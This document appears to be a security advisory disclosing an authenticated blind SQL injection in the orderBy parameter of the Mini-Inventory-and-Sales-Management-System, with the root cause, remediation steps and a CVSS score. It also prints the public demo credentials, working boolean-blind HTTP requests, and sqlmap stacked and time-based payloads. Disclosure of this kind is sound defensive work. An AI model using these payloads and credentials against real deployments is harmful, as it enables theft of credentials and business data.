# SQL Injection in Mini-Inventory-and-Sales-Management-System

**CWE-89 · Authenticated Blind SQL Injection · arbitrary data extraction**

## Product Information

| Field | Value |
|---|---|
| Product | Mini-Inventory-and-Sales-Management-System |
| Framework | CodeIgniter 3.1.13 |
| Affected version | commit `81bf0b5` (latest master, 2026-06-05) |
| Repository | https://github.com/amirsanni/Mini-Inventory-and-Sales-Management-System |

## Summary

SQL Injection via the `orderBy` GET parameter in three endpoints:
- `/index.php/transactions/latr_`
- `/index.php/items/lilt`
- `/index.php/administrators/laad_`

## Root Cause

CodeIgniter 3.1.13 `order_by()` skips identifier escaping when the column
name contains parentheses (the `_is_literal()` check in
`system/database/DB_query_builder.php:2502`), so attacker-controlled input
is concatenated into the `ORDER BY` clause. The application ships a public
demo account (`demo@1410inc.xyz` / `demopass`) documented in the README,
which satisfies the login requirement.

## Reproduction

```http
# 1. Login with public demo credentials
POST /index.php/home/login
email=demo@1410inc.xyz&password=demopass

# 2. Boolean-based blind injection
#    condition TRUE  -> HTTP 200 (data)
#    condition FALSE -> HTTP 500 (Database Error)
GET /index.php/transactions/latr_?orderBy=(SELECT CASE WHEN 1=1 THEN 1 ELSE EXP(1000) END)
GET /index.php/transactions/latr_?orderBy=(SELECT CASE WHEN 1=2 THEN 1 ELSE EXP(1000) END)
```

## Extraction Evidence

```
Database name: 1410inventory

Admin bcrypt password hash (60 chars):
<REDACTED>  (removed from public repo; verified locally against a throwaway DB)
```

## Confirmed by sqlmap

```
Parameter: orderBy (GET)
Type: boolean-based blind
Payload: orderBy=(SELECT (CASE WHEN (3536=3536) THEN 1 ELSE (SELECT 6362 UNION SELECT 6907) END))
Type: stacked queries
Payload: orderBy=1;SELECT SLEEP(5)#
Type: time-based blind
Payload: orderBy=1 AND (SELECT 7028 FROM (SELECT(SLEEP(5)))SQkK)
```

## Impact

With the public demo credentials, an attacker can extract arbitrary data
from the database (credentials, business records, metadata) via blind
SQL injection.

## Remediation

- Whitelist the `orderBy` parameter
- Upgrade CodeIgniter or force identifier escaping in `order_by()`
- Remove the public demo account

## CVSS 3.1

`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (Base 6.5)

## Files

- `poc/request.txt` - HTTP request PoC
- `poc/extract.py` - comma-free blind extraction script
- `evidence/sqlmap.txt` - sqlmap detection output
- `evidence/extracted.txt` - extracted data
